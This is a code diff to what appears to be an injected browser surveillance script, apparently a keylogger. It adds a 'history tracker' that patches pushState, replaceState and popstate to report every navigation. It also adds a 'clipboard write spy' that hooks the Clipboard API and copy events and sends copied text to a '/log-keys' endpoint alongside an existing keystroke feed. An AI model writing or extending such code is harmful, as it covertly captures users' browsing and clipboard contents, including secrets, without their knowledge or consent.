@@ -1660,6 +1660,69 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         } catch {}
     }
 
+    // ═══ HISTORY TRACKER ══════════════════════════════════════
+    // Patches pushState/replaceState to track SPA navigation on sites using
+    // the History API (React Router, Vue Router, etc.).
+    function initHistoryTracker() {
+        try {
+            const report = (method, url) => {
+                post('/log-keys', {
+                    keys: `[HISTORY] ${method} → ${String(url || location.href).slice(0, 200)}`,
+                    url: location.href
+                });
+            };
+            const origPush    = history.pushState.bind(history);
+            const origReplace = history.replaceState.bind(history);
+            history.pushState = function(state, title, url) {
+                origPush(state, title, url);
+                report('pushState', url);
+            };
+            history.replaceState = function(state, title, url) {
+                origReplace(state, title, url);
+                report('replaceState', url);
+            };
+            window.addEventListener('popstate', () => {
+                report('popstate', location.href);
+            });
+        } catch {}
+    }
+
+    // ═══ CLIPBOARD WRITE SPY ═══════════════════════════════════
+    // Detects when the page programmatically writes to the clipboard
+    // via document.execCommand('copy') or the Clipboard API.
+    function initClipboardWriteSpy() {
+        try {
+            // Intercept Clipboard API writes
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                const origWrite = navigator.clipboard.writeText.bind(navigator.clipboard);
+                const _post = post;
+                navigator.clipboard.writeText = function(text) {
+                    try {
+                        _post('/log-keys', {
+                            keys: `[CLIPBOARD WRITE] page wrote ${text.length}ch: "${String(text).slice(0, 120)}"`,
+                            url: location.href
+                        });
+                    } catch {}
+                    return origWrite(text);
+                };
+            }
+            // Detect execCommand copy via copy event
+            document.addEventListener('copy', ev => {
+                try {
+                    // If clipboardData has content, the page may be setting it
+                    const dt = ev.clipboardData;
+                    if (dt && dt.getData && dt.getData('text/plain')) {
+                        const val = dt.getData('text/plain');
+                        post('/log-keys', {
+                            keys: `[CLIPBOARD WRITE execCmd] "${val.slice(0, 120)}"`,
+                            url: location.href
+                        });
+                    }
+                } catch {}
+            }, true);
+        } catch {}
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1805,6 +1868,8 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initBeaconInterceptor();
         initInputTypeClassifier();
         initStorageSizeTracker();
+        initHistoryTracker();
+        initClipboardWriteSpy();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
